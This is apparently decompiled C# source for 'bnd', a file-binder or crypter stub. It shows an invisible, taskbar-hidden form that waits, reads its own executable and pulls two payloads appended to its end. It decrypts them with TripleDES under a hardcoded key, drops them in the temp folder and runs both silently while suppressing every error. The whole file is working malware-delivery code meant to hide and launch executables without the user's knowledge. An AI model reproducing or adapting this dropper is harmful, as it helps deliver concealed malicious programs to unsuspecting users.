using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

[DesignerGenerated]
public class bnd : Form
{
	public class GClass0
	{
		private static TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider_0 = new TripleDESCryptoServiceProvider();

		private static MD5CryptoServiceProvider md5CryptoServiceProvider_0 = new MD5CryptoServiceProvider();

		[DebuggerNonUserCode]
		public GClass0()
		{
		}

		public static byte[] smethod_0(string string_0)
		{
			return md5CryptoServiceProvider_0.ComputeHash(Encoding.ASCII.GetBytes(string_0));
		}

		public static byte[] smethod_1(byte[] byte_0, string string_0)
		{
			tripleDESCryptoServiceProvider_0.Key = smethod_0(string_0);
			tripleDESCryptoServiceProvider_0.Mode = CipherMode.ECB;
			return tripleDESCryptoServiceProvider_0.CreateDecryptor().TransformFinalBlock(byte_0, 0, byte_0.Length);
		}
	}

	private IContainer icontainer_0;

	private int int_0;

	private int int_1;

	private int int_2;

	private int int_3;

	private int int_4;

	private int int_5;

	private string string_0;

	private string string_1;

	private byte[] byte_0;

	[DebuggerNonUserCode]
	public bnd()
	{
		((Form)this).add_Shown((EventHandler)bnd_Shown);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(0, 0);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_ControlBox(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("bnd");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("bnd");
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	private void method_0(int int_6)
	{
		DateTime dateTime = DateTime.Now.AddSeconds(int_6);
		TimeSpan timeSpan;
		do
		{
			timeSpan = dateTime.Subtract(DateTime.Now);
			Application.DoEvents();
			Thread.Sleep(100);
		}
		while (timeSpan.TotalSeconds > 0.0);
	}

	private void bnd_Shown(object sender, EventArgs e)
	{
		try
		{
			method_0(5);
			byte_0 = ((ServerComputer)Class1.Class0_0).get_FileSystem().ReadAllBytes(Application.get_ExecutablePath());
			int_0 = int.Parse(method_1());
			int_2 = int.Parse(method_2());
			int_3 = int.Parse(method_3());
			int_4 = int.Parse(method_4());
			string_0 = method_5();
			string_1 = method_6();
			byte[] array = method_7();
			byte[] array2 = method_8();
			((ServerComputer)Class1.Class0_0).get_FileSystem().WriteAllBytes(Path.GetTempPath() + string_0, array, false);
			((ServerComputer)Class1.Class0_0).get_FileSystem().WriteAllBytes(Path.GetTempPath() + string_1, array2, false);
			method_0(3);
			Process process = new Process();
			process.StartInfo.FileName = Path.GetTempPath() + string_0;
			process.Start();
			method_0(3);
			process.StartInfo.FileName = Path.GetTempPath() + string_1;
			process.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		Application.Exit();
	}

	private string method_1()
	{
		checked
		{
			try
			{
				string text = null;
				int num = byte_0.Length - 8;
				int num2 = byte_0.Length - 1;
				for (int i = num; i <= num2; i++)
				{
					text += Conversions.ToString(Strings.ChrW(unchecked((int)byte_0[i])));
				}
				return text;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string result = null;
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	private string method_2()
	{
		checked
		{
			try
			{
				string text = null;
				int num = byte_0.Length - 16;
				int num2 = byte_0.Length - 9;
				for (int i = num; i <= num2; i++)
				{
					text += Conversions.ToString(Strings.ChrW(unchecked((int)byte_0[i])));
				}
				return text;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string result = null;
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	private string method_3()
	{
		checked
		{
			try
			{
				string text = null;
				int num = byte_0.Length - 24;
				int num2 = byte_0.Length - 17;
				for (int i = num; i <= num2; i++)
				{
					text += Conversions.ToString(Strings.ChrW(unchecked((int)byte_0[i])));
				}
				return text;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string result = null;
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	private string method_4()
	{
		checked
		{
			try
			{
				string text = null;
				int num = byte_0.Length - 32;
				int num2 = byte_0.Length - 25;
				for (int i = num; i <= num2; i++)
				{
					text += Conversions.ToString(Strings.ChrW(unchecked((int)byte_0[i])));
				}
				return text;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string result = null;
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	private string method_5()
	{
		checked
		{
			try
			{
				string text = null;
				int num = byte_0.Length - (32 + int_0);
				int num2 = byte_0.Length - 33;
				for (int i = num; i <= num2; i++)
				{
					text += Conversions.ToString(Strings.ChrW(unchecked((int)byte_0[i])));
				}
				return text;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string result = null;
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	private string method_6()
	{
		checked
		{
			try
			{
				string text = null;
				int num = byte_0.Length - (32 + int_0 + int_2);
				int num2 = byte_0.Length - (33 + int_0);
				for (int i = num; i <= num2; i++)
				{
					text += Conversions.ToString(Strings.ChrW(unchecked((int)byte_0[i])));
				}
				return text;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string result = null;
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	private byte[] method_7()
	{
		checked
		{
			try
			{
				int num = 0;
				byte[] array = new byte[int_3 - 1 + 1];
				int num2 = byte_0.Length - (32 + int_0 + int_2 + int_3);
				int num3 = byte_0.Length - (33 + int_0 + int_2);
				for (int i = num2; i <= num3; i++)
				{
					array[num] = byte_0[i];
					num++;
				}
				return GClass0.smethod_1(array, "P@ssw0rd.2009");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				byte[] result = null;
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	private byte[] method_8()
	{
		checked
		{
			try
			{
				int num = 0;
				byte[] array = new byte[int_4 - 1 + 1];
				int num2 = byte_0.Length - (32 + int_0 + int_2 + int_3 + int_4);
				int num3 = byte_0.Length - (33 + int_0 + int_2 + int_3);
				for (int i = num2; i <= num3; i++)
				{
					array[num] = byte_0[i];
					num++;
				}
				return GClass0.smethod_1(array, "P@ssw0rd.2009");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				byte[] result = null;
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}
}
